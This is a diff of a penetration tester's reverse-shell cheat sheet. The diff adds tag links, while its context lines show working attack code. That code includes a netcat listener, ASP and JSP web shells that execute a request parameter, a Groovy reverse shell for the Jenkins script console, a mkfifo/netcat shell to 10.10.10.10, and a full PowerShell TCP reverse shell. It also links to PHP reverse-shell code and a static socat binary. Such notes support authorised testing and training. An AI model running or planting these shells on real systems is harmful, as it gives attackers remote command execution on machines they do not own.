@@ -13,10 +13,12 @@ Good shell
 ```
 rlwrap nc -lvnp
 ```
+[[nc]]
 #### Cheatsheet
 https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
 
 #### PHP
+[[php]]
 https://raw.githubusercontent.com/Wh1ter0sEo4/reverse_shell_php/refs/heads/main/reverse_shell.php
 
 ```php
@@ -24,19 +26,23 @@ https://raw.githubusercontent.com/Wh1ter0sEo4/reverse_shell_php/refs/heads/main/
 ```
 
 ##### Java:
+[[java]]
 https://alionder.net/jenkins-script-console-code-exec-reverse-shell-java-deserialization/
 
 ##### ASP:
+[[asp]]
 ```asp
 <% eval request("cmd") %>
 ```
 
 ##### JSP:
+[[jsp]] [[java]]
 ```jsp
 <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
 ```
 
 ##### Groovy (jenkins console /script):
+[[groovy]]
 ```Groovy
 String host="10.10.15.232";
 int port=8000;
@@ -45,6 +51,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 ```
 
 ##### Socat port forwarding:
+[[socat]] [[bash]] [[shell]]
 Download:
 https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat
 
@@ -67,7 +74,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
 ```
 
 powershell (run from cmd.exe):
-
+[[powershell]]
 ```powershell
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
 ```
